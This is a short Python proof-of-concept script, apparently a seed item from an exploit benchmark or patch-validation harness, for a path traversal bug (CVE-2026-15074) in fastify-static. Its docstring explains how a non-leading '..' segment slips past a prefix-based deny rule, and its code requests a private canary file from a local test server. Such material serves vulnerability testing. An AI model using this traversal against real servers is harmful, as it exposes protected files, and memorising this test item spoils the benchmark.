#!/usr/bin/env python3
"""[GIVEN] CVE-2026-15074 seed exploit for fastify-static-cve-2026-7120.

Non-leading '..' segment bypasses the allowedPath boundary (/private/ is denied
by prefix): the pathname `/static/foo/../private/canary.txt` does not start with
`/private/`, so allowedPath permits it, and @fastify/send normalizes the '..'
before serving. Reads /data/root/private/canary.txt.

Reaches the flag on v0 (10.1.0); BLOCKED on v1 (10.1.1, CVE-2026-15074 fixed).
"""
from urllib.request import urlopen, Request


def candidate(*, base="http://127.0.0.1:55141"):
    req = Request(base + "/static/foo/../private/canary.txt", method="GET")
    try:
        with urlopen(req, timeout=10) as r:
            return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": ""}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
